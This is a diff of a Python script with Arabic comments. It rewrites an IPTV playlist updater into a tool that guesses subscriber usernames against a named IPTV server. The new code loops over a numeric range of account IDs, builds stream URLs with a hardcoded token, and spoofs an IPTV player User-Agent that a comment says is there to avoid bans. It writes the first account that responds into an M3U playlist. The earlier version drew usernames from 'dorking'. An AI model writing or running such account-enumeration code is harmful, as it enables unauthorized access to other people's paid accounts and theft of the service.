@@ -1,43 +1,50 @@
 import requests
 
-# إعدادات السيرفر
+# إعدادات السيرفر والمعلومات الثابتة
 SERVER = "http://vipwettbornwet.top:8080"
-# معلومات القنوات (ID القناة)
-CHANNELS = ["37642", "37643", "37644"]
 TOKEN_SECRET = "1260f37e4c58"
+CHANNELS = ["37642", "37643", "37644"] # القنوات الأفغانية
 
-# قائمة يوزرات (هنا تضع يوزرات تجدها بالـ Dorking أو اشتراكات أخرى)
-ACCOUNTS = [
-    "VIP016471744476160385",
-    "VIP016471744476160386",
-    "NEW_USER_HERE" 
-]
+# إعداد الهيدر لتبدو كأنك مشغل IPTV حقيقي (تجنب الحظر)
+HEADERS = {
+    'User-Agent': 'IPTVSmartersPlayer',
+    'Accept': '*/*'
+}
 
-def check_link(user):
-    url = f"{SERVER}/{user}/{TOKEN_SECRET}/{CHANNELS[0]}.ts"
+def check_account(user):
+    # نختبر القناة الأولى فقط للتأكد من أن الحساب شغال
+    url = f"{SERVER}/{user}/{TOKEN_SECRET}/{CHANNELS[0]}"
     try:
-        response = requests.head(url, timeout=5)
-        return response.status_code == 200
+        # نستخدم HEAD ليكون الطلب خفيفاً وسريعاً
+        response = requests.head(url, headers=HEADERS, timeout=3, allow_redirects=True)
+        if response.status_code == 200:
+            return True
     except:
-        return False
+        pass
+    return False
 
-def update_file():
-    working_user = None
-    for user in ACCOUNTS:
-        if check_link(user):
-            working_user = user
-            break
-    
-    if working_user:
-        with open("playlist.m3u", "w", encoding="utf-8") as f:
-            f.write("#EXTM3U\n")
-            for ch in CHANNELS:
-                name = "AFGHAN TV" if ch == "37644" else "AFG CHANNEL"
-                f.write(f'#EXTINF:-1 tvg-name="{name}", {name}\n')
-                f.write(f"{SERVER}/{working_user}/{TOKEN_SECRET}/{ch}.ts\n")
-        print(f"✅ Updated with working user: {working_user}")
-    else:
-        print("❌ No working accounts found!")
+def update_m3u_file(working_user):
+    with open("playlist.m3u", "w", encoding="utf-8") as f:
+        f.write("#EXTM3U\n")
+        # توليد الروابط لجميع القنوات باستخدام اليوزر الشغال
+        for ch in CHANNELS:
+            f.write(f'#EXTINF:-1 tvg-id="AFG_{ch}" tvg-name="AFG CHANNEL {ch}", AFG CHANNEL {ch}\n')
+            f.write(f"{SERVER}/{working_user}/{TOKEN_SECRET}/{ch}.ts\n")
+    print(f"✅ تم بنجاح! اليوزر الشغال هو: {working_user}")
+
+def start_fuzzing():
+    print("🚀 جاري بدء عملية الفحص وتخمين الحسابات...")
+    # النطاق الذي حددته أنت (300 إلى 500)
+    for i in range(300, 501):
+        target_user = f"VIP016471744476160{i}"
+        print(f"🔎 فحص الحساب: {target_user}", end="\r")
+        
+        if check_account(target_user):
+            print(f"\n✨ وجدته! حساب فعال: {target_user}")
+            update_m3u_file(target_user)
+            return # نتوقف عند أول حساب شغال لتوفير الوقت والجهد
+            
+    print("\n❌ للأسف لم يتم العثور على حساب شغال في هذا النطاق.")
 
 if __name__ == "__main__":
-    update_file()
+    start_fuzzing()
